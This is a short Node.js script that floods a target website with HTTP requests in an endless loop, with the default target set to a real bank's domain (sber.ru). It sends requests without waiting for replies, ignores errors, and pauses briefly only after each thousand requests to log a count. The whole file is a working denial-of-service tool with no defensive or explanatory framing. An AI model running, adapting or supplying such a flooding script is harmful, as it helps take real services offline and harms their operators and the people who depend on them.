import fetch from 'node-fetch';
import{config} from "dotenv";

config();

const URL = process.env.URL || "https://sber.ru/";

(async () => {
  let i = 1;
  while (true) {
    i++;
    if (i % 1000 === 0) {
      console.log(`${i} were sent to ${URL}`);
      await new Promise((res) => {
        setTimeout(res, 1000)
      })
    }
    
    fetch(URL).catch((e) => e)
  }
})();